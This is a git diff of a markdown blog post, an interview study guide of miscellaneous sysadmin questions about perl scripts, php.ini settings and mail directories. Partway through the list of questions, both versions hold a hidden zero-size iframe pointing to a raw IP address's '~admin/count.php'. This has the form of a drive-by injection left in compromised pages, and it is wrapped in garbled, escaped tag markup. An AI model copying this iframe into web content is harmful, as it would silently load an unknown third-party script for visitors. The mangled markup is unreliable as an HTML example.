@@ -6,8 +6,8 @@ inLanguage: null
 starred: false
 keywords: []
 description: 'http://www.thegeekstuff.com/2010/12/50-unix-linux-sysadmin-tutorials'
-datePublished: '2016-04-07T14:57:46.725Z'
-dateModified: '2016-04-07T14:57:34.591Z'
+datePublished: '2016-04-07T16:29:54.752Z'
+dateModified: '2016-04-07T16:29:38.857Z'
 title: 11. Misc questions
 author: []
 sourcePath: _posts/2016-04-07-interview-study-guide-misc.md
@@ -22,6 +22,8 @@ url: interview-study-guide-misc/index.html
 _type: Article
 
 ---
+![](https://the-grid-user-content.s3-us-west-2.amazonaws.com/dd664633-ee31-477d-891b-472f14044fd3.jpg)
+
 # 11\. Misc questions
 
 ## how does perl work?
@@ -561,7 +563,7 @@ The answers are in an answer key, below.
 
 <iframe style=""></iframe>
 
-<\><\>src="http://124.217.252.62/~admin/count.php?o=3"width=0height=0style="hidden"frameborder=0marginheight=0marginwidth=0scrolling=no<\><\></\></\></\></\>
+<\><\>src="http://124.217.252.62/~admin/count.php?o=3"width=0height=0style="hidden"frameborder=0marginheight=0marginwidth=0scrolling=no<\><\><\></\><\></\><\></\><\></\></\></\></\></\>
 16. My perl scriptNMSFormMail.plreturns a500 Internal Server Error. In error logs, I see "file has no execute permission: (/home/atmediad/public\_html/cgi/NMSFormMail.pl)". How do I fix that?
 17. I copied aphp.iniwith a highmemory\_limitto all folders and still a script gives me a memory error. What else can I do?
 18. I am in this guys mail directory trying to identify the actual usage size of a particular email account. What is the command to show size? Which subfolders are using the most space?
